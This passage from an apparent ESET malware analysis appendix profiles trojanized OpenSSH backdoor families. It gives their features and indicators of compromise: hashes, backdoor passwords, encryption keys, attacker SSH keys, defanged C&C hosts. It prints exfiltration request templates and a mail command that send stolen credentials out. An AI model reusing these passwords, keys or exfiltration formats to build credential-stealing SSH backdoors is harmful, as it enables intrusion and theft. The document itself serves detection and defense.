`OpenSSH_5.3p1`\n\nLog filename `“/usr/share/polkit-1/policy.out”`\n\nBackdoor password `“openbsd-compat”`\n\n\nHash (SHA-1) `0c487d16c2bebb200342f1a7599799a858505b93`\n\n\nType `Daemon`\n\nVersion `OpenSSH_5.3p1`\n\nLog filename `“/usr/include/X11/sessmgr/coredump.in”`\n\nBackdoor password `“openbsd-compat”`\n\n#### 10.6 Atollon\n\n##### ESET detection name\n\nLinux/SSHDoor.AT\n\n##### Known period of activity\n\nFrom 2014 to 2017\n\n\n-----\n\n##### Features\n\n- log username and password + SSH private key (client version only)\n\n+ remote host (most recent version of the backdoor)\n\n- data encrypted using AES-256-CBC (key generated from the /dev/urandom file,\n\nencrypted with RSA public key stored in external file and written to the log file)\n\n- attacker can log in as root (password bcrypted)\n\n- anti-logging feature if login with backdoor password\n\n- uses external module to clean OpenSSH logs\n\n- obfuscation (strings encrypted)\n\n- client and daemon versions available\n\n##### Exfiltration techniques\n\n- log structure:\n\n  - new version: “%s %s:%s” (remote_host, username, password)\n\n  - old version: “%s:%s” (username, password)\n\n  - private key: “%s %s” (username, passwd_private_key)\n\n##### IoCs\n\n\n_Table 8_ _Atollon samples configuration_\n\n\nHash (SHA-1) `41eeac3a00971ccd5c04a9cabc10257278b45bd3`\n\n\nType `Daemon`\n\nVersion `OpenSSH_5.3p1`\n\nLog filename `“/usr/share/man/hu/sd”`\n\nBackdoor password `“$1$qZZu0d$ciSfcyjvp4713igP4R2Kz0” (bcrypted)`\n\n\nHash (SHA-1) `1f484b74a3c0cd79d39efb6c9af5644f50054cd4`\n\n\nType `Client`\n\nVersion `OpenSSH_5.3p1`\n\nLog filename `“/usr/share/man/hu/sd”`\n\nBackdoor password `N/A`\n\n\nHash (SHA-1) `fa965b0099cacbf64d428d267f13dcc21bb37ede`\n\n\nType `Client`\n\nVersion `OpenSSH_6.7p1`\n\nLog filename `“/usr/share/man/man1/sd”`\n\nBackdoor password `N/A`\n\n\nHash (SHA-1) `292ab2dcb3af0efe8e0b36b480fb914b2f763b6a`\n\n\nType `Daemon`\n\nVersion `OpenSSH_6.7p1`\n\nLog filename `“/usr/share/man/man1/sd”`\n\nBackdoor password `“$1$Rm9vLe$KBk/bBdtHwLh1WT.XmrUR1” (bcrypted)`\n\n\n-----\n\n#### 10.7 Batuu\n\n##### ESET detection names\n\nLinux/SSHDoor.BX, Linux/SSHDoor.CA\n\n##### Known period of activity\n\nFrom 2012 to present (Oct 2018)\n\n##### Features\n\n          - log arguments given to the SSH binary and passwords\n\n          - data encoded (NOT bytes)\n\n          - only the client version was found\n\n##### Exfiltration techniques\n\n          - log structure\n\n         - arguments: “ssh: ~(av[%d]: %s\\n)” (argv_index, argv[argv_index])\n\n        - passwords: “readpass: %s\\n” (password)\n\n##### Sources\n\nLooks to be based on work by “acme” from 2004:\n_[http://www.securiteam.com/exploits/5MP0E20CAM.html](http://www.securiteam.com/exploits/5MP0E20CAM.html)_\n\n##### IoCs\n\n\n_Table 9_ _Batuu samples configuration_\n\n\nHash (SHA-1) `3a9d4ea8d1056d50dbbe294987bfe2e7050e7fb0`\n\n\nVersion `OpenSSH_3.7.1p2 (x86)`\n\nLog filename `“/usr/lib/libt1x.so.1.5”`\n\n\nHash (SHA-1) `213480254030b94a10a3cae35dff7e9645f68be7`\n\n\nVersion `OpenSSH_5.4p1 (x86)`\n\nLog filename `“/usr/lib/libcurl.a.2.1”`\n\n\nHash (SHA-1) `f314c2e8f63d9662e63e803f6457a1708684a6d7`\n\n\nVersion `OpenSSH_5.2p1 (x86)`\n\nLog filename `“/usr/lib/libpanel.so.a.3”`\n\n#### 10.8 Bespin\n\n##### ESET detection name\n\nLinux/SSHDoor.BE\n\n##### Known period of activity\n\nFrom 2018\n\n##### Features\n\n          - log remote host, login time, username and password\n\n        - only a client version detected\n\n\n-----\n\n##### Exfiltration techniques\n\n- log structure: “%Y-%m-%d %H:%M:%S --MARK-- %s %s:%s” (login_time,\n\nremote_host, username, password)\n\n- data is encrypted (3DES-CBC, key hardcoded)\n\n##### Existing documentation or source code\n\nAttributed to Energetic Bear (aka Crouching Yeti) by Kaspersky:\n_[https://securelist.com/energetic-bear-crouching-yeti/85345/](https://securelist.com/energetic-bear-crouching-yeti/85345/)_\n\n##### IoCs\n\n\n_Table 10_ _Bespin samples configuration_\n\n\nHash (SHA-1) `48bd2075313b1731938ee82282dc2562fbaa6cb1`\n\n\nVersion `OpenSSH_6.6.1p1`\n\nLog filename `“/var/tmp/.pipe.sock”`\n\n3DES key\n```\n         43AC12995F9B230967FA1306B3D8E3FF1021C9E1EE92F30C\n\n#### 10.9 Bonadan\n\n##### ESET detection name\n\n```\nLinux/SSHDoor.BO\n\n##### Known period of activity\n\nFrom 2018\n\n##### Features\n\n          - log username and password\n\n          - attacker can log in as root\n\n          - anti-logging feature\n\n          - only a daemon version detected\n\n          - bot feature (more details in the Exotic planets of the OpenSSH backdoors\n\n_galaxy section)_\n\n          - can download a cryptocurrency mining module\n\n##### Exfiltration techniques\n\n          - log structure: “user:password -->%s:%s\\n”\n\n          - data is XOR encrypted (hardcoded key)\n\n##### IoCs\n\n\n_Table 11_ _Bonadan samples configuration_\n\n\nHash (SHA-1) `8ea8f206100a73b3ec47069633989e8b4b8046b6`\n\n\nType `Daemon`\n\nVersion `OpenSSH_7.2p2`\n\nLog filename `“/usr/share/lsx/.ig.swr”`\n\nBackdoor password `“AaSSh.@test”`\n\n\n-----\n\nXOR key\n```\n         39 41 30 0D 08 7A 10 0A 61 1A\n\n#### 10.10 Borleias\n\n##### ESET detection name\n\n```\nLinux/SSHDoor.BZ\n\n##### Known period of activity\n\nFrom 2017 to present (Oct 2018)\n\n##### Features\n\n          - login time, username and password\n\n          - only a client version detected\n\n##### Exfiltration techniques\n\n          - log structure: “%Y-%m-%d %H:%M:%S [%s]”\n\n          - data is XOR encrypted (hardcoded key)\n\n##### IoCs\n\n\n_Table 12_ _Borleias samples configuration_\n\n\nHash (SHA-1) `846cdb8cd32cac0bd6d739746f9368850ff5228d`\n\n\nVersion `OpenSSH_6.0p1`\n\nLog filename `“/var/lib”`\n\nC&C `94.75.207[.]3`\n\nXOR key\n```\n         m12!*g0^&@$^,./?L>|.”}568[/.b;\\)KmQA<I(48h<N(KP%$!8)*3(-=_&h3\n\n#### 10.11 Chandrila\n\n##### ESET Detection name\n\n```\nLinux/SSHDoor.CH\n\n##### Known period of activity\n\nFrom 2018\n\n##### Features\n\n          - log authentication type, username and password\n\n          - bot using SSH passwords to communicate with a C&C server\n\n(detailed in the Exotic planets of the OpenSSH backdoors galaxy section)\n\n          - some strings are computed at execution\n\n          - client and daemon version\n\n\n-----\n\n##### Exfiltration techniques\n\n- log structure: “S%s %s:%s”\n\n- data is only base64 encoded\n\n##### Network specific\n\n- data is preceded by a magic number (0x7D927105)\n\n- a SHA1 of the encoded data is sent before the data\n\n##### IoCs\n\n\n_Table 13_ _Chandrila samples configuration_\n\n\nHash (SHA-1) `6db7f00564d28a5a236ee38a00da9405409357af`\n\n\nType `Client`\n\nLog filename `“/usr/share/man/.urandom”`\n\nC&C `198.23.187[.]46`\n\nBackdoor password `N/A`\n\n\nHash (SHA-1) `0f8d41ec2ed3a7f7d0d28fe1c167b6480f80de3f`\n\n\nType `Daemon`\n\nLog filename `“/usr/share/man/.urandom”`\n\nC&C `198.23.187[.]46`\n\nBackdoor password `“C0011455OpenSSHd” (command line) or`\n```\n                     “C001145SOpenSSHd” (reverse shell IP)\n\n#### 10.12 Coruscant\n\n##### ESET detection name\n\n```\nLinux/SSHDoor.CD\n\n##### Known period of activity\n\nFrom 2018\n\n##### Features\n\n          - log remote host, username and password\n\n          - attacker can log in with root privileges (plain username and password)\n\n          - anti-logging feature\n\n          - only the daemon version found\n\n##### Exfiltration techniques\n\n          - log structure: “(server) %s:%s@%s\\n” (username, password, remote_host)\n\n          - C&C: patf.site90[.]net port 80 (153.92.0[.]100 US)\n\n          - exfiltrate data using HTTP POST requests\n```\n      POST /index.php HTTP/1.1\n      Host: patf.site90[.]net\n      Content-Length: %d\n      (server) %s:%s@%s\\n\n\n```\n\n-----\n\n##### IoCs\n\n\n_Table 15_ _Coruscant samples configuration_\n\n\nHash (SHA-1) `2d767d0ede311cf3a853e90d18f50ae102358590`\n\n\nVersion `OpenSSH_5.6p1`\n\nLog filename `“/dev/.ctrl”`\n\nC&C `patf.site90[.]net`\n\nBackdoor password `“~X4CK3R”:”QWERTY!”`\n\n#### 10.13 Crait\n\n##### ESET detection name\n\nLinux/SSHDoor.CI\n\n##### Known period of activity\n\nFrom 2018\n\n##### Features\n\n          - log authentication method, remote host, remote_port, username and password\n\n          - attacker can log in as root\n\n          - anti-logging features\n\n          - strings encrypted\n\n          - backdoor in client and daemon but also in ssh-add, ssh-agent, ssh-keygen\n\nand ssh-keyscan\n\n##### Exfiltration techniques\n\n          - [data structure is available as a Katai structure on our GitHub IoC repository](https://github.com/eset/malware-ioc)\n\n          - data is encrypted with RC4+ (key generated from /dev/random and encrypted\n\nwith RSA)\n\n##### OpenSSH version trojanized\n\n          - OpenSSH_7.2p2\n\n##### Remarks\n\nNew version of Borleias backdoor.\n\n##### IoCs\n\n\n_Table 14_ _Crait samples configuration_\n\n\nHash (SHA-1) `eaaffa6ae25fdccda2bcb7dfaf205da41129548b`\n\n\nType `Client`\n\nLog filename `“/usr/share/man/man0/.cache”`\n\nC&C `176.9.47[.]34:28739`\n\nBackdoor password `N/A`\n\n\n-----\n\nType `ssh-add`\n\nLog filename `“/usr/share/man/man0/.cache”`\n\nC&C `176.9.47[.]34:28739`\n\nBackdoor password `N/A`\n\n\nHash (SHA-1) `191ab40fd464a5b80b287e848f1a4ad7fcd572ae`\n\n\nType `ssh-agent`\n\nLog filename `“/usr/share/man/man0/.cache”`\n\nC&C `176.9.47[.]34:28739`\n\nBackdoor password `N/A`\n\n\nHash (SHA-1) `1169569d23a1e028d9c6f6e0c4d1ffe6532d0d60`\n\n\nType `ssh-keygen`\n\nLog filename `“/usr/share/man/man0/.cache”`\n\nC&C `176.9.47[.]34:28739`\n\nBackdoor password `N/A`\n\n\nHash (SHA-1) `c4070d1ad35070c8df2914bf56ad554e18af4961`\n\n\nType `ssh-keyscan`\n\nLog filename `“/usr/share/man/man0/.cache”`\n\nC&C `176.9.47[.]34:28739`\n\nBackdoor password `N/A`\n\n\nHash (SHA-1) `ab7ab346296d5c306e642590b21417d634c8abeb`\n\n\nType `Daemon`\n\nLog filename `“/usr/share/man/man0/.cache”`\n\nC&C `176.9.47[.]34:28739`\n\nBackdoor password `5b28726ee7526a2b9efd73705d0e1e89 (MD5) or`\n```\n             8c7f8f511ddbba00a551a266098ccad2 (MD5)\n\n```\nRSA public modulus (public exponent is: 65537)\n```\n  a93387b8f1a725d07bb39c3a66ac1828b85d131fca619d3205e5061e5edaf6effb4\n\n  7ea76f2243c70fb9ce886a1f4eafae2c768759610b8ebb32923ba584d352cd7bc83\n\n  facb8011ac4589a02a558f7fd8fbca459044cf8fc65eb775fbf4952c538f54936be\n\n  244c1dbe8a210ac4fded9110e894b5d53dfd892eeff16f29f0d2b9c3dd5d6ca1739\n\n  8fba58efa0f7dde1ad165616423004ce024219151a47604b7eb633d9231c812438a\n\n  e599bde368f88c35c57adbb73631a2aa2ec21b8973568aaef8dbc49845accb31e40\n\n  a0a52ef716177d1f7451a4f2ec25a0cf642dbde110cae4571dcf148eab911db3f57\n\n  016893c7dc70d7c717173cc1e64c5c93a91b129bba7\n\n```\nSSH public key\n```\n  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEA2zHxhkR+mQdhtsOZbDvY5XpM9on6m28\n\n  wRmrcc2lve8HpsrBCEiMXId5DMwoAOvrFXkuxQdQKaaLpwRR575zEUATZGb3BpMJ6pg\n\n  Fxf5vP2xC2r0IhOdpJqZzPFsgIpNQGLGCbTCPgZeNrjGCrQRji4lep7/E4xFHY3KXnh\n\n  /fRS7TKIawdYCqHfeoEHZ29mQQ4zceuaqxKiMGLsMy62pew5hhEgs0W7aYPo7/or1C3\n\n  eLTshfGOGJRoc8P9zSL7QNZCk3fIlym3Uv4FSaSxaeel3fJNvfdTvRYn6vXbBpq6o9Y\n\n  vqCGMxLjB371wfYrIuFyCQlW/FGmcsRUTg913R3HlYw==\n\n```\n\n-----\n\n#### 10.14 Endor\n\n##### ESET detection names\n\nLinux/SSHDoor.E, Linux/SSHDoor.G, Linux/SSHDoor.I, Linux/SSHDoor.S, Linux/\nSSHDoor.Z, Linux/SSHDoor.AC, Linux/SSHDoor.AH, Linux/SSHDoor.AO, Linux/\nSSHDoor.AP, Linux/SSHDoor.AW, Linux/SSHDoor.BV, Linux/SSHDoor.CC\n\n##### Known period of activity\n\nFrom 2010 to present (Oct 2018)\n\n##### Features\n\n          - updated variant of Alderaan\n\n          - log remote host (only in client version), username and password\n\n          - attacker can log in as root (plain password)\n\n          - anti-logging feature\n\n          - client and daemon versions available\n\n##### Exfiltration techniques\n\n          - log structure:\n\n         - client version: “+host: %s +user: %s +password: %s\\n”\n\n        - daemon version: “+user: %s +password: %s\\n”\n\n          - only in some client versions\n\n         - execute: “cat <log_filename> | mail -s “New Servers” <email_address>”\n\n##### Existing documentation or source code\n\n[Source code available online: https://github.com/Te-k/openssh-backdoor](https://github.com/Te-k/openssh-backdoor)\n\nIt seems it has been reused quite a lot for malicious activities:\n\n          - hxxp://draqusor.hi2[.]ro/sniffer.tgz\n\n          - hxxp://hackingoriginal[.]ro/c.zip\n\n          - hxxp://aridan.hol[.]es/sniffer.tgz\n\n          - hxxp://diicot.altervista[.]org/etc.zip\n\n          - hxxp://prg.do[.]am/sniffer.tgz\n\n          - hxxp://werwolf.altervista[.]org/sniffer.zip\n\n          - hxxp://havijuu.pe[.]hu/snif.tgz\n\n          - hxxp://sonic.do[.]am/sshdb.tar.gz\n\n##### IoCs\n\n\n_Table 16_ _Endor samples configuration_\n\n\nHash (SHA-1) `ebb450393809f657f1ab77b4582e0c4758f7b50d`\n\n\nType `Daemon`\n\nVersion `OpenSSH_6.6.1p1`\n\nLog filename `“/usr/include/netda.h”`\n\nBackdoor password `“password”`\n\nEmail `N/A`\n\n\n-----\n\nType `Client`\n\nVersion `OpenSSH_2.5.3 (x86)`\n\nLog filename `“/usr/include/pwd.h”`\n\nBackdoor password `N/A`\n\nEmail `N/A`\n\n\nHash (SHA-1) `ce79d1bee06b42a5d710baaec7bea519236749ba`\n\n\nType `Client`\n\nVersion `OpenSSH_6.0p1`\n\nLog filename `“/usr/include/ide.h”`\n\nBackdoor password `N/A`\n\nEmail `jupitersimarte@gmail[.]com`\n\n\nHash (SHA-1) `7a80ecbebc8cf06bc77513380c64600ba9f1856b`\n\n\nType `Daemon`\n\nVersion `OpenSSH_4.3p2`\n\nLog filename `“/usr/include/netda.h”`\n\nBackdoor password `“1.162.2”`\n\nEmail `N/A`\n\n\nHash (SHA-1) `bd547812018e59be543d9742b01431eb2e5e2641`\n\n\nType `Daemon`\n\nVersion `OpenSSH_6.6.1p1`\n\nLog filename `“/usr/include/sys/record.h”`\n\nBackdoor password `“Pqfu_o6j5vYi7o”`\n\nEmail `N/A`\n\n\nHash (SHA-1) `d3a0b7d4a07b89555c77f1f1425f7469df884088`\n\n\nType `Daemon`\n\nVersion `OpenSSH_5.3p1`\n\nLog filename `“/usr/bin/ssd”`\n\nBackdoor password `“zVmRvLrutLPa”`\n\nEmail `jupitersimarte@gmail[.]com`\n\n\nHash (SHA-1) `2f0a064230d406c9133def6d2a65830fd2c65f6a`\n\n\nType `Client`\n\nVersion `OpenSSH_5.2p1`\n\nLog filename `“/usr/include/netda.h”`\n\nBackdoor password `N/A`\n\nEmail `N/A`\n\n\n-----\n\nType `Client`\n\nVersion `OpenSSH_3.9p1`\n\nLog filename `“/usr/include/pwd2.h”`\n\nBackdoor password `N/A`\n\nEmail `N/A`\n\n\nHash (SHA-1) `6d949fdfa29140662634aaf3fdc3657c99d278e1`\n\n\nType `Client`\n\nVersion `OpenSSH_5.1p1`\n\nLog filename `“/usr/include/pwd2.h”`\n\nBackdoor password `N/A`\n\nEmail `N/A`\n\n\nHash (SHA-1) `9de46ff09d575ee46ebc7ecaebe9e3cc368f9fc9`\n\n\nType `Client`\n\nVersion `OpenSSH_5.5p1`\n\nLog filename `“/usr/include/netda.h”`\n\nBackdoor password `N/A`\n\nEmail `N/A`\n\n\nHash (SHA-1) `d49bcc5e710bdae7746b79a6bfe8ce16b8ff84cb`\n\n\nType `Client`\n\nVersion `OpenSSH_4.2p1`\n\nLog filename `“/usr/include/out.h”`\n\nBackdoor password `N/A`\n\nEmail `N/A`\n\n#### 10.15 Jakku\n\n##### ESET detection names\n\nLinux/SSHDoor.J, Linux/SSHDoor.L\n\n##### Known period of activity\n\nFrom 2011 to 2015\n\n##### Features\n\n          - log remote_host, username and password\n\n          - can update the C&C address/hostname\n\n          - attacker can log in with root privileges (plain password)\n\n          - anti-logging feature\n\n          - obfuscation (strings are RC4 encrypted)\n\n          - client and daemon version available\n\n\n-----\n\n##### Exfiltration techniques\n\n- C&C: status-ok[.]com port 80 (194.146.180[.]41, UA)\n\n- exfiltrate data using HTTP GET requests\n\n- data structure:\n\n  - client version:\n\n   - username/passwords: “sid=%s” (uuencode(“%s --> %s:%s@%s” localuser,\n\nserveruser, password, remote_host))\n\n  - daemon version:\n\n   - update C&C: “cid=%s&bc=1” (MAC_address)\n\n   - username/passwords: “cid=%s&text=%s” (MAC_address,\n\nbase64(username:password))\n```\n    GET /? HTTP/1.0\n    Host: status-ok[.]com\n    %s\n\n##### Existing documentation or source code\n\n```\n[Activity witnessed by victim: https://securityblogru.livejournal.com/101017.html](https://securityblogru.livejournal.com/101017.html)\n\n##### IoCs\n\n\n_Table 17_ _Jakku samples configuration_\n\n\nHash (SHA-1) `fd7af0fcb483c2e308c453519156df31e9e1dce6`\n\n\nType `Daemon`\n\nVersion `OpenSSH_5.8p2`\n\nC&C `status-ok[.]com`\n\nBackdoor password `“random()root!”`\n\n\nHash (SHA-1) `d9841ef6e14d1a6a369501402bf8fe5b607db0be`\n\n\nType `Daemon`\n\nVersion `OpenSSH_3.6p1`\n\nC&C `status-ok[.]com`\n\nBackdoor password `“drowssap999”`\n\n\nHash (SHA-1) `e7610aad54003b0cc78ca2f2f0ca51d6250e9dca`\n\n\nType `Client`\n\nVersion `OpenSSH_3.61p2`\n\nC&C `status-ok[.]com`\n\nBackdoor password `N/A`\n\nRC4 key\n```\n  A1 71 31 17 11 1A 22 27 55 00 66 A3 10 FE C2 10 22 32 6E 95 90 84 F9\n  11 73 62 95 5F 4D 3B\n\n```\nSSH public key\n```\n  ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA0g/wdIrAPPTKa8pDuvFhlTVECbYr4b\n\n  pS1E9op3vtrdNwT4/UJUiSlCRUXhj64LHn9Y8Lu1Tp7AxP0r3AzOEpGDhFt7aO7oDz\n\n  e8KfHQAX5R1C6hOpP7nVdpqu2duqeRDBGBfAlEToqHL5+3i3Skc0W5GolnmRt964jU\n\n  iGWAm9HLBHLu/1RsCzWzRZoUTuBTQSNR8caB7sa5jg7xlpi+2NNA+9U4fIflZ2kJQoh\n  j7ekxi78ZfJ6elsrJfKTTxun6kZ6AsoLqYLQCaRnDNj3yD4LF/TO9rfhBMSdNME2TT\n\n  idzekGteOhXASkImi66gwt0eicMASIKreMf2l3NnXGx+luQ==\n\n```\n\n-----\n\n#### 10.16 Kamino\n\n##### ESET detection names\n\nLinux/SSHDoor.K, Linux/SSHDoor.A, Linux/SSHDoor.B\n\n##### Known period of activity\n\nFrom 2012 to present (Oct 2018)\n\n##### Features\n\n          - log remote_host, remote_port, machine_name username and password\n\n          - can update the C&C address/hostname\n\n          - can load configuration (SSH key, C&C hostname) from an external file named\n\n“/var/run/.options”\n\n          - attacker can log in with root privileges (plain password or SSH key)\n\n          - obfuscation (strings encrypted)\n\n          - only a daemon version found\n\n          - anti-logging feature and connection log deletion (“/var/run/utmp”, “/var/run/\n\nwtmp”, “/var/log/secure”, “/var/log/auth.log”, “/var/log/messages”, “/var/log/\naudit/audit.log”, “/var/log/xferlog”)\n\n##### Exfiltration techniques\n\n          - C&C: listens on port 80\n\n          - request structure:\n\n1. update C&C: “b=1&name=%s&uuid=%s” (machine_name, UUID)\n\n2. initial request: “port=%s&uname=%s&uuid=%P” (remote_host:remote_\n\nport, machine_name, UUID)\n\n3. username/passwords: “sid=%s&uname=%s&uuid=%P”\n\n(username:password, machine_name, UUID)\n\n          - 2 and 3 are XOR encrypted and base64 encoded → “id=%s&m=%s”\n\n(XOR_key_rsa_encrypted, data_xor_encrypted)\n\n          - exfiltrate data using HTTP POST requests\n```\n        POST %s HTTP/1.1Host: hagaipipko[.]net\n        Connection: close\n        Content-Type: application/x-www-form-urlencoded\n        Content-Length: %d\n        %s\n\n##### OpenSSH version trojanized\n\n```\n          - OpenSSH_5.3p1\n\n##### Existing documentation or source code\n\n[Documented by ESET in 2013: https://www.welivesecurity.com/2013/01/24/](https://www.welivesecurity.com/2013/01/24/linux-sshdoor-a-backdoored-ssh-daemon-that-steals-passwords/)\n_[linux-sshdoor-a-backdoored-ssh-daemon-that-steals-passwords/](https://www.welivesecurity.com/2013/01/24/linux-sshdoor-a-backdoored-ssh-daemon-that-steals-passwords/)_\n\nUsed by Cobalt and Carbanak (aka Anunak) backdoor according to Group-IB\n[research: https://www.group-ib.com/blog/renaissance](https://www.group-ib.com/blog/renaissance)\n\n\n-----\n\n##### IoCs\n\n\n_Table 18_ _Kamino samples configuration_\n\n\nHash (SHA-1) `422fafa3a87a7d6d2ca3c2197955df7b1e58efb8`\n\n\nUUID `“ba7ff018-a64a-9e48-f151-5583d8e8b844”`\n\nC&C `hagaipipko[.]net`\n\nURL to update C&C `“/nl”`\n\nBackdoor password `“9VHrMDiAMUQBpYJz3vop”`\n\n\nHash (SHA-1) `cb7a464aa8d58f26f6561c32ef4a1464c583a7ca`\n\n\nUUID `N/A`\n\nC&C `linuxrepository[.]org`\n\nURL to update C&C `N/A`\n\nBackdoor password `“iJ93MnFj4VnWf0sA78gCx”`\n\n\nHash (SHA-1) `7a85595ecf040a310f5d3d2098ec4e40cfd704ff`\n\n\nUUID `“232bd65f-772c-fb7a-4026-85adb7676452”`\n\nC&C `hagaipipko[.]net`\n\nURL to update C&C `“/nl”`\n\nBackdoor password `“9VHrMDiAMUQBpYJz3vop”`\n\n\nHash (SHA-1) `b0eea95e442ebc75f73b1f979de0494b33a831ff`\n\n\nUUID `“3c17d24a-88e3-7b2c-11eb-1ea836890ad2”`\n\nC&C `hagaipipko[.]net`\n\nURL to update C&C `“/nl”`\n\nBackdoor password `“9VHrMDiAMUQBpYJz3vop”`\n\n\nHash (SHA-1) `23c3868e904f76d3421a98d0d6944b30e09c3014`\n\n\nUUID `“9effd8e8-f179-310f-7834-004b748c2d38”`\n\nC&C `javacdnupdate[.]com`\n\nURL to update C&C `“/upd”`\n\nBackdoor password `“jYiCr0OS8aLP3TKajQn5”`\n\n\nHash (SHA-1) `804a40acf2689f3ad9bfeb7cd74f75b2a6d2b021`\n\n\nUUID `“f7385d56-e808-42e5-8104-b6f08457c84d”`\n\nC&C `javacdnupdate[.]com`\n\nURL to update C&C `“/upd”`\n\nBackdoor password `“jYiCr0OS8aLP3TKajQn5”`\n\n\n-----\n\nRSA public key\n```\n         -----BEGIN PUBLIC KEY----\n         MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC0LpZig4XGsKVVRPHwyE1Kpi48\n\n         mxImIA9fkVkvEyRVlagjl89js1zAd7+cSDMO1SMSGdZgERPYdykME+cDrLm/csUh\n\n         PvjF1h47YeyrARUdpOz6D2NT1/ZdIMcgHYUS4hWsNHsxzLWK8QIb+10nvVfCLHry\n\n         /tVNZ/nMEj1J/Loj0QIDAQAB\n\n         -----END PUBLIC KEY---\n```\nSSH public key\n```\n         ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXP0CPTJEmOZa2ur20Hobes8Umj\n\n         7o1aFv7dFsSxp8v9k6wLj+0WSLBCIQ+6mkUdy1m27313+bLIgOjkKq3ZQKvczFYth\n\n         FWfrUxtXUv2Wrum+k/DynxU8YYOhD2tJBLRAJDmUvijKSOGllcP8t+ZDDkIqc65k4\n\n         q6jNtSmcPPkFCXB6Pr4BfKj2C4NhhCyx6O18PSrEa6SbugZgPPo7dTHVFY5JCYbPv\n\n         dyu+zoT3NgkPTHsdEMcZaXCWU5I5xIv5nT1TvSn6gnPkemcsAUIAA77eTTL9TSr2F\n\n         hCcLSQQScN0yDzn5ddOWFzd2taOpVvis3ANnWy+4YhwwbBlUtyoifDP\n\n#### 10.17 Kessel\n\n##### ESET detection name\n\n```\nLinux/SSHDoor.CK\n\n##### Known period of activity\n\nFrom 2018\n\n##### Features\n\n          - log remote host, remote username, username, password, private key filename\n\nand password\n\n          - uses many exfiltration methods (local file, HTTP, TCP, DNS)\n\n          - bot feature based on DNS TXT records to communicate with the C&C server\n\n(detailed in the Exotic planets of the OpenSSH backdoors galaxy section)\n\n          - strings are RC4 encrypted\n\n##### Exfiltration techniques\n\nHTTP\n\n          - POST requests to port 80\n\n          - can use proxy if set in the configuration\n\n          - set a fake host in the header of the HTTP request (see example below)\n\n          - data is RC4 encrypted (key hardcoded)\n\nHTTP request structure\n```\n         POST http://%s:%d/ HTTP/1.0\n\n         Host: google.com\n\n         Proxy-Connection: keep-alive\n\n         Content-Length: %d%s\n\n```\nTCP\n\n          - data is sent to port TCP/443\n\n          - data is RC4 encrypted (key hardcoded)\n\n\n-----\n\nDNS\n\n- data is RC4 encrypted (key randomly generated)\n\n- the key as well as a CRC32 of the data are sent alongside the data\n\n- data is encoded to hexadecimal and sent through the sub-host of the C&C\n\n- DNS queries to port UDP/53\n\nLocal file\n\n- log filename defined in the configuration\n\n- data is RC4 encrypted (key hardcoded)\n\n##### IoCs\n\n\n_Table 19_ _Kessel samples configuration_\n\n\nHash (SHA-1) `f5ac779c8fd506e7d4b72b70331623042a807a6b`\n\n\nType `Client`\n\nVersion `OpenSSH_5.3p1`\n\nLog filename `“/tmp/KCtbBo”`\n\nC&C `dc0.cc`\n\n\nHash (SHA-1) `3e0c142d6b656c490c28e0910628db5886dfc143`\n\n\nType `Client`\n\nVersion `OpenSSH_7.2p2`\n\nLog filename `“/tmp/KCtbBo”`\n\nC&C `dc0.cc`\n\n#### 10.18 Mimban\n\n##### ESET detection names\n\nLinux/SSHDoor.M, Linux/SSHDoor.Y\n\n##### Known period of activity\n\nFrom 2015 to present (Oct 2018)\n\n##### Features\n\n          - log remote_host, remote_port, username and password\n\n          - attacker can log in with root privileges (plain password or SSH key)\n\n          - anti-logging feature\n\n          - C&C hostname encrypted\n\n          - client and daemon version available\n\n##### Exfiltration techniques\n\n          - C&C: linux-flavor[.]net port 1194 (69.64.47[.]10 US)\n\n          - data structure:\n\n         - initial request: “>|||%s|||%s|||10|||%d|||<” (num_version, UUID, remote_ssh_port)\n\n         - passwords: “>|||%s|||%s|||11|||%s|||%s|||%s|||%s|||<” (num_version, UUID,\n\nusername password remote ssh port remote host) machine name UUID)\n\n\n-----\n\n- data is RC4 encrypted and base64 encoded → “<|||%s|||%s|||%d|||>”\n\n(RC4_key_rsa_encrypted, data_rc4_encrypted, length_data_decrypted)\n\n##### OpenSSH versions trojanized\n\n- OpenSSH_4.3p2\n\n- OpenSSH_5.3p1\n\n- OpenSSH_6.0p1\n\n##### IoCs\n\n\n_Table 20_ _Mimban samples configuration_\n\n\nHash (SHA-1) `70e9078f9d2df6dfb394a5016b5f6581b810e7a6`\n\nType `Daemon`\n\nVersion `OpenSSH_4.3p2`\n\nUUID `1dbe9a73-c59e-4f1f-b3f9-6b730ab3ecaf`\n\nC&C linux-flavor[.]net\n\nRC4 Key `gANkKxbWazVzLjbbakRrfxWkfuJlLGYa`\n\nBackdoor password `“28e305ffac314b72cce8f222ee5710f8“ (MD5)`\n\n\nHash (SHA-1) `fb550cc228b6a4fb2a254a782a0d5a5b3b96d8b2`\n\n\nType `Client`\n\nVersion `OpenSSH_4.3p2`\n\nUUID `1dbe9a73-c59e-4f1f-b3f9-6b730ab3ecaf`\n\nC&C linux-flavor[.]net\n\nRC4 Key `gANkKxbWazVzLjbbakRrfxWkfuJlLGYa`\n\nBackdoor password `N/A`\n\nHash (SHA-1) `c608f2b7b0b893e8dcc092ecfcc8bd715f86fbc7`\n\nType `Daemon`\n\nVersion `OpenSSH_6.0p1`\n\nUUID `0d6fa712-cd93-4490-9e75-979b1e0a65de`\n\nC&C linux-flavor[.]net\n\nRC4 Key cuetQhcOmfiJGwDWrjXIpzTglcLFAwLU\n\nBackdoor password `“7f0e7fc709e7d63be14cbe7ae034f702“ (MD5)`\n\n\nHash (SHA-1) `45e617ca0c551f70d2d87313149a302ee4d4ba1b`\n\n\nType `Client`\n\nVersion `OpenSSH_5.3p1 (x86)`\n\nUUID `2199b968-8a08-4dac-b3b8-8c64a168c598`\n\nC&C linux-flavor[.]net\n\nRC4 Key `tTlxgWHDLroHwuHaqYjdwciBsxhuzfny`\n\nBackdoor password `N/A`\n\n\n-----\n\nType `Daemon`\n\nVersion `OpenSSH_5.3p1 (x86)`\n\nUUID `962d7af7-3e01-48a2-8100-8377916c12f8`\n\nC&C linux-flavor[.]net\n\nRC4 Key `THAlVGydJjBaElZeiSvMRVAInypylVvq`\n\nBackdoor password `“68676a481dac9a15e7fdea9b8a8b0e5e“ (MD5)`\n\n\nHash (SHA-1) `83e3de6d96b4f6b0309d0722e3196970de829b52`\n\n\nType `Client`\n\nVersion `OpenSSH_5.3p1 (x86)`\n\nUUID 